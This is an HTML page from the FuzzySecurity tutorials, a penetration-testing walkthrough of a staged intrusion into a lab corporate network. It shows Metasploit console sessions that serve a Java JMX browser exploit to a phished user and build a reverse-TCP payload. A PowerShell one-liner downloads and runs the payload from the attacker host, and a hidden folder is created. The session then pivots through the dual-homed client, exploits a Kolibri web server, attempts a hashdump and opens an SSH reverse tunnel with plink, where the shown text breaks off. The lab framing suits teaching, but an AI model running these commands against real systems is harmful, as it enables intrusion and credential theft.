@@ -1,0 +1,912 @@
+<!DOCTYPE html>
+<!--[if lt IE 7 ]><html class="ie ie6" lang="en"> <![endif]-->
+<!--[if IE 7 ]><html class="ie ie7" lang="en"> <![endif]-->
+<!--[if IE 8 ]><html class="ie ie8" lang="en"> <![endif]-->
+<!--[if (gte IE 9)|!(IE)]><!--><html lang="en"> <!--<![endif]-->
+<head>
+
+  <!-- Basic Page Needs -->
+  <meta charset="utf-8">
+  <title>FuzzySecurity | Tutorials: Scenario Based Infrastructure Hacktics</title>
+  <meta name="description" content="">
+  <meta name="author" content="">
+
+  <!-- CSS Style -->
+  <link rel="stylesheet" href="../css/style.css"> 
+  
+  <!-- Color Skins -->
+  <link rel="stylesheet" href="../css/skins/red.css" name="skins"> 
+  
+  <!-- Layout Style -->
+  <link rel="stylesheet" href="../css/layout/wide.css" name="layout"> 
+  
+  <!-- Small Icons -->
+  <link rel="stylesheet" href="../css/icons.css">  
+  
+  <!-- Start JavaScript -->
+  
+    <script src="../js/jquery-1.7.2.min.js"></script> <!-- jQuery library -->
+    <script src="../js/jquery.easing.1.3.min.js"></script> <!-- jQuery Easing --> 
+    <script src="../js/jquery-ui.min.js"></script> <!-- jQuery Ui --> 
+    <script src="../js/jquery.cookie.js"></script> <!-- jQuery cookie --> 
+    <script src="../js/jquery.uniform.min.js"></script> <!-- jQuery Uniform -->
+    <script src="../js/ddsmoothmenu.js"></script> <!-- Nav Menu ddsmoothmenu -->
+    <script src="../js/jquery.flexslider.js"></script> <!-- Flex Slider  -->
+    <script src="../js/jquery.eislideshow.js"></script> <!-- Elastic Slider  -->
+    <script src="../js/jquery.iconmenu.js"></script> <!-- Sliding Text and Icon Menu Style  -->
+    <script src="../js/colortip.js"></script> <!-- Colortip Tooltip Plugin  -->
+    <script src="../js/tytabs.js"></script> <!-- jQuery Plugin tytabs  -->
+    <script src="../js/carousel.js"></script> <!-- jQuery Carousel  -->
+    <script src="../js/jquery.prettyPhoto.js"></script> <!-- jQuery Prettyphoto  -->
+    <script src="../js/jquery.isotope.min.js"></script> <!-- Isotope Filtering  -->
+    <script src="../js/selectnav.js"></script> <!-- Responsive Navigation Menu by SelectNav -->
+    <script src="../js/jquery.ui.totop.js"></script> <!-- UItoTop plugin  -->
+    <script src="../js/custom.js"></script> <!-- Custom Js file for javascript in html -->
+  
+  <!-- End JavaScript -->
+
+  <!--[if lt IE 9]>
+      <script src="js/html5.js"></script>
+  <![endif]-->
+
+  <!-- Favicons -->
+  <link rel="shortcut icon" href="../images/favicon/favicon.ico">
+  <link rel="apple-touch-icon" href="../images/favicon/apple-touch-icon.png">
+  <link rel="apple-touch-icon" sizes="72x72" href="../images/favicon/apple-touch-icon-72x72.png">
+  <link rel="apple-touch-icon" sizes="114x114" href="../images/favicon/apple-touch-icon-114x114.png">
+
+</head>
+<body>
+
+  <div id="wrap" class="boxed">
+
+  <header>
+    <div class="container clearfix">
+    
+      <div class="five columns">
+        <div class="logo">
+        <a href="index.html">
+          <img src="../images/logo.png" alt="FuzzySec" />
+        </a>
+        </div>
+      </div><!-- End Logo -->
+      
+      <div class="eleven columns">
+        <nav id="menu" class="navigation">
+          <ul id="nav">
+            <li><a href="../index.html">Home</a>
+            </li>
+            <li><a href="../tutorials.html" class="active">Tutorials</a>
+            </li>
+            <li><a href="../coding.html">Scripting</a>
+            </li>
+            <li><a href="../exploits.html">Exploits</a>
+            </li>
+            <li><a href="../links.html">Links</a>
+            </li>
+            <li><a href="../patreon.html">Patreon</a></li><li><a href="../contact.html">Contact</a></li>
+          </ul> 
+        </nav>
+      </div><!-- End Menu -->
+      
+      
+      <div class="sixteen columns"><hr /></div>
+      
+    </div><!-- End Container -->
+  </header><!-- <<< End Header >>> -->
+  
+  <div class="container clearfix">
+  
+    <div class="page-columns">
+    
+    <ul class="breadcrumbs">
+      <li><a href="index.html"><span class="icon home gray"></span></a></li>
+          <li><a href="../index.html">Home</a> <b>&#187;</b></li>
+          <li><a href="../tutorials.html">Tutorials</a> <b>&#187;</b></li>
+          <li>Scenario Based Infrastructure Hacktics</li>
+      </ul>
+      
+      <!-- section 16 Columns -->
+      
+      <div class="recent-work gallery clearfix">
+      <div class="eighteen columns bottom">
+	<div style="height:20px;" align="right">
+		<link type="text/css" rel="stylesheet" href="https://www.fuzzysecurity.com/css/patreon.css"/>
+		<button class="btn btn-2 btn-2g"><a href="https://www.patreon.com/FuzzySec" target="_blank"><img src="https://c5.patreon.com/external/logo/become_a_patron_button.png" style="border-radius: 10px;height:40px;"></a></button>
+	</div>
+        <h2 class="title">Game Over: Scenario Based Infrastructure Hacktics<span class="line"></span></h2>
+        <p>Hello and welcome! Today I will be walking you through a scenario-based infrastructure hack. I am doing this for two reasons. (1) I was setting up some infrastructure tests in my home lab so I might as well share my efforts. (2) Showcasing client-side attacks as an entry point to a corporate network. Me and a couple of my colleagues were recently looking at the &quot;Java Applet JMX Exploit&quot; that was posted on pastebin <a href="http://pastebin.com/cUG2ayjh">here</a> and we tested it out on a couple of VM's running IE8-10 (Win 7, Win 8), predictably all browsers poped calc. Today organisational perimeters are generally well protected and publicly available exploits just don't hit the proverbial mark. In my opinion there are two entry points in a corporate environment which pose more risk than other attack vectors. (1) The web application infrastructure; the web is a really complicated animal and with so many technologies floating around mistakes happen (sqli, XSS, CSRF, broken authentication, SOAP logic errors, file upload, command injection,...). (2) Client side attacks; targeted client side attacks are extremely efficient, talented and motivated attackers have had a very high rate of success (think of the carnage the Elderwood gang caused, please take some time to read <a href="http://www.symantec.com/connect/blogs/elderwood-project">this</a>).</p><br />
+
+<p>Today we will see how a compromised client can serve as an entry point into the corporate network. We will be using quite a few tactics to acchieve our goals like metasploit pivoting, powershell, ssh tunneling and pass-the-hash. Take a look at the network setup.</p><br />
+
+<p><strong>Network Layout:<br />
+Internet => </strong>192.168.44.1/24<strong><br />
+Corporate Network => </strong>192.168.17.1/24</p><br />
+
+<p><strong>Clients:<br />
+A  Attacker - BT5R3: </strong>192.168.44.137<strong><br />
+V1 Client - Win7 (Dual-Homed): </strong>192.168.44.1 and 192.168.17.1<strong><br />
+V2 Legacy Web Server - XP SP1: </strong>192.168.17.134<strong><br />
+V3 Legacy Server - XP Pro SP3: </strong>192.168.17.132</p><br />
+
+<p>As I designed the lab I know exactly what vulnerabilities are present, today’s tutorial is mostly about how the attacker can propagate on the internal network. You will also notice that I do some things which aren't really necessary but again this is just an opportunity to look at a variety of techniques which are at the disposal of the attacker. Below you can see a network diagram which should help you understand the obstacles we will have to overcome to reach our objectives (please forgive my poor Gimp skills!).</p><br />
+
+          <img src="images/netsec_1.png" alt="" class="pic" />
+          
+<div class="fourteen columns bottom">
+<h2 class="title">V1 Client Side Foothold<span class="line"></span></h2>
+<p>Like I said before sophisticated attackers have had great success at using client side attacks to gain entry to the corporate network. Exploits such as the recent Java JMX bug offer such powerful weapons to the attacker with remote code execution across multiple browsers and operating systems. A regular user may easily be tricked into browsing to a malicious link if he/she thinks the sender is trusted or is properly motivated. Time to launch our attack on the corporate network. First we will serve up the Java JMX exploit on our attackers box and then we will try to entice a poor employee to visit our malicious website.</p>
+
+    <div class="terminal_wrap" style="background:#CCC">
+      <pre>msf > <span style='color:#2B8156;'>search JMX</span>
+
+Matching Modules
+================
+
+   Name                                      Disclosure Date  Rank       Description
+   ----                                      ---------------  ----       -----------
+   exploit/multi/browser/java_jre17_jmxbean  2013-01-10       excellent  Java Applet JMX Remote Code
+                                                                         Execution
+   exploit/multi/http/jboss_bshdeployer      2010-04-26       excellent  JBoss JMX Console Beanshell
+                                                                         Deployer WAR Upload and
+                                                                         Deployment
+   exploit/multi/http/jboss_invoke_deploy    2007-02-20       excellent  JBoss DeploymentFileRepository
+                                                                         WAR Deployment (via
+                                                                         JMXInvokerServlet)
+   exploit/multi/http/jboss_maindeployer     2007-02-20       excellent  JBoss JMX Console Deployer
+                                                                         Upload and Execute
+   exploit/multi/misc/java_rmi_server        2011-10-15       excellent  Java RMI Server Insecure
+                                                                         Default Configuration Java
+                                                                         Code Execution
+   
+   
+msf  exploit(<span style='color:#ff0000;'>java_jre17_jmxbean</span>) > <span style='color:#2B8156;'>show options</span>
+
+Module options (exploit/multi/browser/java_jre17_jmxbean):
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   SRVHOST     0.0.0.0          yes       The local host to listen on. This must be an address on the
+                                          local machine or 0.0.0.0
+   SRVPORT     8080             yes       The local port to listen on.
+   SSL         false            no        Negotiate SSL for incoming connections
+   SSLCert                      no        Path to a custom SSL certificate (default is randomly generated)
+   SSLVersion  SSL3             no        Specify the version of SSL that should be used (accepted:
+                                          SSL2, SSL3, TLS1)
+   URIPATH     /JavaEveryday    no        The URI to use for this exploit (default is random)
+
+
+Payload options (java/meterpreter/reverse_http):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.44.137   yes       The local listener hostname
+   LPORT  8080             yes       The local listener port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Generic (Java Payload)
+   
+msf  exploit(<span style='color:#ff0000;'>java_jre17_jmxbean</span>) > <span style='color:#2B8156;'>exploit</span>
+<span style='color:#333399;'>[*]</span> Exploit running as background job.
+<span style='color:#333399;'>[*]</span> Started HTTP reverse handler on http://192.168.44.137:8080/
+<span style='color:#333399;'>[*]</span> Using URL: http://0.0.0.0:8080/JavaEveryday
+<span style='color:#333399;'>[*]</span>  Local IP: http://192.168.44.137:8080/JavaEveryday
+<span style='color:#333399;'>[*]</span> Server started.</pre>
+<br />
+</div>
+<p>&nbsp;</p>
+<p>All we need to do now is trick the unsuspecting user (V1) into browsing to our website.</p><p>&nbsp;</p>
+        
+          <img src="images/netsec_2.png" alt="" class="pic" />
+    
+<p>&nbsp;</p>
+    <p>Obviously this crude attempt won't get us very far but you get the idea right. A motivated attacker can obfuscate the link and craft a mail that looks like it comes from a trusted source or supply a seemingly compelling reason to visit the website. This will be the starting point for our infrastructure scenario.</p>
+    
+    <div class="terminal_wrap" style="background:#CCC">
+      <pre>msf  exploit(<span style='color:#ff0000;'>java_jre17_jmxbean</span>) > <span style='color:#2B8156;'>exploit</span>
+      
+<span style='color:#333399;'>[*]</span> Exploit running as background job.
+<span style='color:#333399;'>[*]</span> Started HTTP reverse handler on http://192.168.44.137:8080/
+<span style='color:#333399;'>[*]</span> Using URL: http://0.0.0.0:8080/JavaEveryday
+<span style='color:#333399;'>[*]</span>  Local IP: http://192.168.44.137:8080/JavaEveryday
+<span style='color:#333399;'>[*]</span> Server started.
+<span style='color:#333399;'>[*]</span> 192.168.44.1     java_jre17_jmxbean - handling request for /JavaEveryday/
+<span style='color:#333399;'>[*]</span> 192.168.44.1:58312 Request received for /favicon.ico...
+<span style='color:#333399;'>[*]</span> 192.168.44.1:58312 Unknown request to /favicon.ico GET /favicon.ico HTTP/1.1
+
+Accept: */*
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)
+Host: 192.168.44.137:8080
+Connection: Keep-Alive
+Content-Length: 0
+...
+
+<span style='color:#333399;'>[*]</span> 192.168.44.1     java_jre17_jmxbean - handling request for /JavaEveryday/eHRimLIo.jar
+<span style='color:#333399;'>[*]</span> 192.168.44.1     java_jre17_jmxbean - handling request for /JavaEveryday/eHRimLIo.jar
+<span style='color:#333399;'>[*]</span> 192.168.44.1:58314 Request received for /INITJM...
+<span style='color:#333399;'>[*]</span> Meterpreter session 1 opened (192.168.44.137:8080 -> 192.168.44.1:58314) at 2013-01-18 20:50:07 +0000
+
+msf  exploit(<span style='color:#ff0000;'>java_jre17_jmxbean</span>) > <span style='color:#2B8156;'>sessions -l</span>
+
+Active sessions
+===============
+
+  Id  Type                   Information     Connection
+  --  ----                   -----------     ----------
+  1   meterpreter java/java  b33f @ Trident  192.168.17.133:8080 -> 192.168.17.1:53650 (192.168.17.1)
+  
+msf  exploit(<span style='color:#ff0000;'>java_jre17_jmxbean</span>) > <span style='color:#2B8156;'>sessions -i 1</span>
+<span style='color:#333399;'>[*]</span> Starting interaction with 1...
+
+<span style='color:#ff0000;'>meterpreter</span> > <span style='color:#2B8156;'>sysinfo</span>
+Computer    : Trident
+OS          : Windows 7 6.1 (x86)
+Meterpreter : java/java
+
+<span style='color:#ff0000;'>meterpreter</span> > <span style='color:#2B8156;'>getuid</span>
+Server username: b33f
+
+<span style='color:#ff0000;'>meterpreter</span> > <span style='color:#2B8156;'>shell</span>
+Process 1 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Users\b33f\Desktop><span style='color:#2B8156;'>ipconfig</span>
+ipconfig
+
+Windows IP Configuration
+
+Ethernet adapter VMware Network Adapter VMnet10:
+
+   Connection-specific DNS Suffix  . : 
+   Link-local IPv6 Address . . . . . : fe80::15ce:3f81:aaf6:3173%16
+   IPv4 Address. . . . . . . . . . . : 192.168.17.1
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 
+
+Ethernet adapter VMware Network Adapter VMnet8:
+
+   Connection-specific DNS Suffix  . : 
+   Link-local IPv6 Address . . . . . : fe80::a504:dea1:5746:e518%17
+   IPv4 Address. . . . . . . . . . . : 192.168.44.1
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : </pre>
+<br />
+</div>
+
+<p>&nbsp;</p>
+<p>As we can see from the meterpreter session our host is dual-homed and will likely give us access to additional non routable hosts on the corporate network. First however we are going to replace our existing java_meterpreter with a proper meterpreter. As some of you will know the java_meterpreter doesn't contain all the available functionality. It also gives me the opportunity to showcase to cool tricks: (1) Inline poweshell code execution and (2) metasploit session upgrading. First we will set up a web server to host our shell and then we will use powershell to download and execute our payload.</p>
+
+    <div class="terminal_wrap" style="background:#CCC">
+      <pre><span style='color:#ff0000;'>root@bt</span>:~/Desktop# <span style='color:#2B8156;'>/etc/init.d/apache2 start</span>
+ * Starting web server apache2  [ OK ] 
+ 
+<span style='color:#ff0000;'>root@bt</span>:~# <span style='color:#2B8156;'>netstat -atnp |grep apache2</span>
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name 
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1467/apache2
+
+<span style='color:#ff0000;'>root@bt</span>:~# <span style='color:#2B8156;'>msfpayload windows/shell/reverse_tcp lport=9988 lhost=192.168.44.137 X > /var/www/funz.exe</span>
+Created by msfpayload (http://www.metasploit.com).
+Payload: windows/shell/reverse_tcp
+Length: 290
+Options: {"lport"=>"9988", "lhost"=>"192.168.44.137"}
+
+<span style='color:#ff0000;'>root@bt</span>:~# <span style='color:#2B8156;'>locate plink.exe</span>
+/pentest/windows-binaries/tools/plink.exe
+
+<span style='color:#ff0000;'>root@bt</span>:~# <span style='color:#2B8156;'>cp /pentest/windows-binaries/tools/plink.exe /var/www/</span>
+
+<span style='color:#ff0000;'>root@bt</span>:~/Desktop# <span style='color:#2B8156;'>ls -la /var/www/</span>
+total 2100
+drwxr-xr-x  3 root root    4096 2013-01-18 01:28 .
+drwxr-xr-x 16 root root    4096 2011-06-08 14:51 ..
+-rw-r--r--  1 root root   73802 2013-01-18 01:27 funz.exe
+-rw-r--r--  1 root root     177 2011-05-10 17:01 index.html
+-rwxrw-rw-  1 root root 1667584 2011-06-30 14:52 ncat.exe
+-rwxrw-rw-  1 root root  381816 2010-04-27 12:04 PsExec.exe
+drwxr-xr-x  2 root root    4096 2011-05-10 17:01 wstool </pre>
+<br />
+</div>
+
+<p>&nbsp;</p>
+<p>In addition to our payload we will also be uploading plink.exe which is a command line version of Putty which will allow us to create shh tunnels in and out of the corporate network should we need them.</p>
+
+    <div class="terminal_wrap" style="background:#CCC">
+      <pre><strong><em># First we will background our meterpreter session (Ctrl+Z) till we drop back into msfconsole and set up a
+# listener for our payload.</em></strong>
+      
+msf  exploit(<span style='color:#ff0000;'>java_jre17_jmxbean</span>) > <span style='color:#2B8156;'>use multi/handler</span>
+
+msf  exploit(<span style='color:#ff0000;'>handler</span>) > <span style='color:#2B8156;'>set payload windows/shell/reverse_tcp</span>
+payload => windows/shell/reverse_tcp
+
+msf  exploit(<span style='color:#ff0000;'>handler</span>) > <span style='color:#2B8156;'>set lport 9988</span>
+lport => 9988
+
+msf  exploit(<span style='color:#ff0000;'>handler</span>) > <span style='color:#2B8156;'>set lhost 192.168.44.137</span>
+lhost => 192.168.44.137
+
+msf  exploit(<span style='color:#ff0000;'>handler</span>) > <span style='color:#2B8156;'>exploit -j</span>
+<span style='color:#333399;'>[*]</span> Exploit running as background job.
+<span style='color:#333399;'>[*]</span> Started reverse handler on 192.168.44.137:9988 
+<span style='color:#333399;'>[*]</span> Starting the payload handler...
+
+<strong><em># Ok now lets log back into our original meterpreter sessions and use powershell to download our files
+# and execute our payload.</em></strong>
+
+msf  exploit(<span style='color:#ff0000;'>handler</span>) > <span style='color:#2B8156;'>sessions -i 1</span>
+<span style='color:#333399;'>[*]</span> Starting interaction with 1...
+
+<span style='color:#ff0000;'>meterpreter</span> > <span style='color:#2B8156;'>shell</span>
+Process 1 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Users\b33f\Desktop><span style='color:#2B8156;'>md EvilHacker</span>
+md EvilHacker
+
+<strong><em># This will make the folder hidden and won't even show up if "Show Hidden Files and Folders" option is
+# enabled.</em></strong>
+
+C:\Users\b33f\Desktop><span style='color:#2B8156;'>attrib +s +h "C:\Users\b33f\Desktop\EvilHacker"</span>
+attrib +s +h "C:\Users\b33f\Desktop\EvilHacker"
+
+C:\Users\b33f\Desktop><span style='color:#2B8156;'>cd EvilHacker</span>
+cd EvilHacker
+
+<strong><em># This is all in one line</em></strong>
+
+C:\Users\b33f\Desktop\EvilHacker><span style='color:#2B8156;'>cmd /c "PowerShell (New-Object System.Net.WebClient).DownloadFile
+('http://192.168.44.137/funz.exe','funz.exe');(New-Object System.Net.WebClient).DownloadFile
+('http://192.168.44.137/plink.exe','plink.exe');Start-Process 'funz.exe'"</span>
+
+<strong><em># We immediately get notified of the incoming shell by our handler.</em></strong>
+
+<span style='color:#333399;'>[*]</span> Encoded stage with x86/shikata_ga_nai
+<span style='color:#333399;'>[*]</span> Sending encoded stage (267 bytes) to 192.168.44.1
+
+C:\Users\b33f\Desktop\EvilHacker><span style='color:#2B8156;'>^Z</span>
+Background channel 1? [y/N]  <span style='color:#2B8156;'>y</span>
+
+<span style='color:#ff0000;'>meterpreter</span> > 
+Background session 1? [y/N]  <span style='color:#2B8156;'>y</span>
+
+msf  exploit(<span style='color:#ff0000;'>handler</span>) > <span style='color:#2B8156;'>sessions</span>
+
+Active sessions
+===============
+
+Id  Type                   Information     Connection
+--  ----                   -----------     ----------
+1   meterpreter java/java  b33f @ Trident  192.168.44.137:8080 -> 192.168.44.1:58314 (192.168.44.1)
+2   shell windows                          192.168.44.137:9988 -> 192.168.44.1:58736 (192.168.44.1)
+  
+<strong><em># We can use the "sessions -u" option to upgrade our shell to a proper meterpreter session.</em></strong>
+  
+msf  exploit(<span style='color:#ff0000;'>handler</span>) > <span style='color:#2B8156;'>sessions -u 2</span>
+
+<span style='color:#333399;'>[*]</span> Started reverse handler on 192.168.44.137:9988 
+<span style='color:#333399;'>[*]</span> Starting the payload handler...
+<span style='color:#333399;'>[*]</span> Command Stager progress - 1.66% done (1699/102108 bytes)
+<span style='color:#333399;'>[*]</span> Command Stager progress - 3.33% done (3398/102108 bytes)
+<span style='color:#333399;'>[*]</span> Command Stager progress - 4.99% done (5097/102108 bytes)
+<span style='color:#333399;'>[*]</span> Command Stager progress - 6.66% done (6796/102108 bytes)
+<span style='color:#2B8156;'>[...Snip...]</span>
+<span style='color:#333399;'>[*]</span> Command Stager progress - 96.51% done (98542/102108 bytes)
+<span style='color:#333399;'>[*]</span> Command Stager progress - 98.15% done (100216/102108 bytes)
+<span style='color:#333399;'>[*]</span> Command Stager progress - 99.78% done (101888/102108 bytes)
+<span style='color:#333399;'>[*]</span> Command Stager progress - 100.00% done (102108/102108 bytes)
+
+msf  exploit(<span style='color:#ff0000;'>handler</span>) > <span style='color:#2B8156;'>sessions</span>
+
+Active sessions
+===============
+
+Id  Type                   Information            Connection
+--  ----                   -----------            ----------
+1   meterpreter java/java  b33f @ Trident         192.168.44.137:8080 -> 192.168.44.1:58314 (192.168.44.1)
+2   shell windows                                 192.168.44.137:9988 -> 192.168.44.1:58736 (192.168.44.1)
+3   meterpreter x86/win32  Trident\b33f @ TRIDENT 192.168.44.137:9988 -> 192.168.44.1:58770 (192.168.44.1)
+
+<strong><em># Lets kill off the sessions we don't need anymore.</em></strong>
+ 
+msf  exploit(<span style='color:#ff0000;'>handler</span>) > <span style='color:#2B8156;'>sessions -k 1</span>
+<span style='color:#333399;'>[*]</span> Killing session 1
+<span style='color:#333399;'>[*]</span> 192.168.44.1 - Meterpreter session 1 closed.
+
+msf  exploit(<span style='color:#ff0000;'>handler</span>) > <span style='color:#2B8156;'>sessions -k 2</span>
+<span style='color:#333399;'>[*]</span> Killing session 2
+<span style='color:#333399;'>[*]</span> 192.168.44.1 - Command shell session 2 closed.</pre>
+<br />
+</div>
+
+<p>&nbsp;</p>
+<p>As a final step in setting up our forward base of attack we will scan the internal non routable network for live hosts and add a route to that network in metasploit so we can pivot our attacks.</p>
+
+    <div class="terminal_wrap" style="background:#CCC">
+      <pre><span style='color:#ff0000;'>meterpreter</span> > <span style='color:#2B8156;'>run arp_scanner -r 192.168.17.1/24</span>
+<span style='color:#333399;'>[*]</span> ARP Scanning 192.168.17.1/24
+<span style='color:#333399;'>[*]</span> IP: 192.168.17.1 MAC 00:50:56:c0:00:01
+<span style='color:#333399;'>[*]</span> IP: 192.168.17.134 MAC 00:0c:29:33:39:21
+<span style='color:#333399;'>[*]</span> IP: 192.168.17.132 MAC 00:0c:29:71:74:f7
+
+msf  exploit(<span style='color:#ff0000;'>handler</span>) > <span style='color:#2B8156;'>route add 192.168.17.1 255.255.255.0 3</span>
+<span style='color:#333399;'>[*]</span> Route added
+
+msf  exploit(<span style='color:#ff0000;'>handler</span>) > <span style='color:#2B8156;'>route print</span>
+
+Active Routing Table
+====================
+
+   Subnet             Netmask            Gateway
+   ------             -------            -------
+   192.168.17.1       255.255.255.0      Session 3</pre>
+<br />
+</div>
+
+<p>&nbsp;</p>
+        
+          <img src="images/netsec_3.png" alt="" class="pic" />
+    
+<p>&nbsp;</p>
+
+<h2 class="title">V2 Legacy Web Server<span class="line"></span></h2>
+      <br /><p>As I mentioned before the corporate network perimeter is generally well protected. That same diligence is (generally) not applied to the internal network for a variety of reasons. Upgrading OS'es costs allot of money, patching may cause downtime no one is willing to sign off on and generally people consider the internal network to be a safe place. Enter our (unrealistic) XP SP1 legacy HTTP server running a vulnerable version of Kolibri. Since we added a route to the corporate network in msf we can now forward our traffic through V1 to the non routable hosts.</p><p>&nbsp;</p>
+
+    <div class="terminal_wrap" style="background:#CCC">
+<pre>msf  exploit(<span style='color:#ff0000;'>handler</span>) > <span style='color:#2B8156;'>nmap -sS -T5 -v 192.168.17.134</span>
+<span style='color:#333399;'>[*]</span> exec: nmap -sS -T5 -v 192.168.17.134
+
+Starting Nmap 5.51SVN ( http://nmap.org ) at 2013-01-18 21:25 GMT
+Initiating Ping Scan at 21:25
+Scanning 192.168.17.134 [3 ports]
+Completed Ping Scan at 21:25, 0.01s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 21:25
+Completed Parallel DNS resolution of 1 host. at 21:25, 0.03s elapsed
+Initiating SYN Stealth Scan at 21:25
+Scanning 192.168.17.134 [1000 ports]
+Discovered open port 135/tcp on 192.168.17.134
+Discovered open port 8080/tcp on 192.168.17.134
+Discovered open port 1025/tcp on 192.168.17.134
+Discovered open port 139/tcp on 192.168.17.134
+Discovered open port 445/tcp on 192.168.17.134
+Discovered open port 5000/tcp on 192.168.17.134
+Completed SYN Stealth Scan at 21:25, 3.28s elapsed (1000 total ports)
+Nmap scan report for 192.168.17.134
+Host is up (1.0s latency).
+
+PORT     STATE SERVICE
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+1025/tcp open  NFS-or-IIS
+5000/tcp open  upnp
+8080/tcp open  http-proxy
+MAC Address: 00:0C:29:33:39:21 (VMware)
+
+Read data files from: /opt/framework/share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 3.53 seconds
+           Raw packets sent: 1527 (67.164KB) | Rcvd: 543 (21.744KB)</pre>
+<br />
+</div>
+
+<p>&nbsp;</p>
+<p>A bit of service enumeration will reveal that the http-proxy is actually Kolibri HTTP Server. You could tunnel out the port and browse to the site or look at the raw dump when enumerating with amap but I leave that up to the diligent reader to play with. There is already an exploit present for Kolibri in metasploit but it only supports XP SP3. It literally took me five minutes start to finish to launch a debugger on a test system, look for the appropriate addresses on SP1 and modify the exploit in metasploit accordingly.</p>
+  
+    <div class="terminal_wrap" style="background:#CCC">
+<pre>msf  exploit(<span style='color:#ff0000;'>handler</span>) > <span style='color:#2B8156;'>use exploit/windows/http/kolibri_http</span>
+
+msf  exploit(<span style='color:#ff0000;'>kolibri_http</span>) > <span style='color:#2B8156;'>set rhost 192.168.17.134</span>
+rhost => 192.168.17.134
+
+msf  exploit(<span style='color:#ff0000;'>kolibri_http</span>) > <span style='color:#2B8156;'>set rport 8080</span>
+rport => 8080
+
+<strong><em># Take care to set a bind payload as the host has no way to route back to our attacker.</em></strong>
+
+msf  exploit(<span style='color:#ff0000;'>kolibri_http</span>) > <span style='color:#2B8156;'>set payload windows/meterpreter/bind_tcp</span>
+payload => windows/meterpreter/bind_tcp
+
+msf  exploit(<span style='color:#ff0000;'>kolibri_http</span>) > <span style='color:#2B8156;'>show options</span>
+
+Module options (exploit/windows/http/kolibri_http):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   Proxies                   no        Use a proxy chain
+   RHOST    192.168.17.134   yes       The target address
+   RPORT    8080             yes       The target port
+   VHOST                     no        HTTP server virtual host
+
+
+Payload options (windows/meterpreter/bind_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique: seh, thread, process, none
+   LPORT     4444             yes       The listen port
+   RHOST     192.168.17.134   no        The target address
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows XP sp3
+   
+msf  exploit(<span style='color:#ff0000;'>kolibri_http</span>) > <span style='color:#2B8156;'>exploit</span>
+
+msf  exploit(<span style='color:#ff0000;'>handler</span>) > <span style='color:#2B8156;'>sessions</span>
+
+Active sessions
+===============
+
+Id  Type                   Information                             Connection
+--  ----                   -----------                             ----------
+3   meterpreter x86/win32  Trident\b33f @ TRIDENT                  192.168.44.137:9988 
+                                                                   -> 192.168.44.1:58770 (192.168.44.1)
+4   meterpreter x86/win32  B33F-URLVV9CUV5\user1 @ B33F-URLVV9CUV5 192.168.44.137-192.168.44.1:0 
+                                                                   -> 192.168.17.134:4444 (192.168.17.134)
+  
+msf  exploit(<span style='color:#ff0000;'>handler</span>) > <span style='color:#2B8156;'>sessions -i 4</span>
+<span style='color:#333399;'>[*]</span> Starting interaction with 4...
+
+<span style='color:#ff0000;'>meterpreter</span> > <span style='color:#2B8156;'>getuid</span>
+Server username: B33F-URLVV9CUV5\user1
+
+<span style='color:#ff0000;'>meterpreter</span> > <span style='color:#2B8156;'>sysinfo</span>
+Computer        : B33F-URLVV9CUV5
+OS              : Windows XP (Build 2600, Service Pack 1).
+Architecture    : x86
+System Language : en_US
+Meterpreter     : x86/win32
+
+<strong><em># Seems like user1 is a low privilege user and won't be able to give us SYSTEM level access to the box</em></strong>
+
+<span style='color:#ff0000;'>meterpreter</span> > <span style='color:#2B8156;'>hashdump</span>
+<span style='color:#333399;'>[-]</span> priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
+
+<span style='color:#ff0000;'>meterpreter</span> > <span style='color:#2B8156;'>getsystem</span>
+<span style='color:#333399;'>[-]</span> priv_elevate_getsystem: Operation failed: Access is denied.</pre>
+<br />
+</div>
+
+<p>&nbsp;</p>
+<p>At this point there are a couple of things we could do. In metasploit we could run "search exploit/windows/local" and run one of the local privilege escalation exploits through our existing session or we could directly exploit MS08_067 since we already have a route to the network. We will be doing something a bit more complicated though to demonstrate the power of ssh tunneling. We will tunnel out port 445 on the remote host all the way back to our attacker and then launch MS08_067 on our local box through the tunnel to V2 and get a shell back. This example is a bit contrived but there are cases where ssh tunneling will save you skin. Since V1 can route connections to our attacker and to V2 we will be using V1 as the bridge for our tunnel.</p>
+ 
+    <div class="terminal_wrap" style="background:#CCC">
+<pre><strong><em># First start your ssh server on BackTrack.</em></strong>
+
+<span style='color:#ff0000;'>root@bt</span>:~# <span style='color:#2B8156;'>/etc/init.d/ssh start</span>
+Rather than invoking init scripts through /etc/init.d, use the service(8)
+utility, e.g. service ssh start
+
+Since the script you are attempting to invoke has been converted to an
+Upstart job, you may also use the start(8) utility, e.g. start ssh
+ssh start/running, process 4985
+
+<strong><em># Drop back into a shell on V1 and start the tunnel. It will look like you drop out of metasploit back
+# into a terminal but thats normal since you opening a ssh shell.
+#
+# Tunnel Syntax: plink -l username -pw "password" -R attacker_port:victim_ip:victim_port attacker_ip</em></strong>
+
+C:\Users\b33f\Desktop\EvilHacker><span style='color:#2B8156;'>plink -l root -pw "s3cr3tpa$$word" -R 445:192.168.17.134:445 192.168.44.137</span>
+plink -l root -pw "s3cr3tpa$$word" -R 445:192.168.17.134:445 192.168.44.137
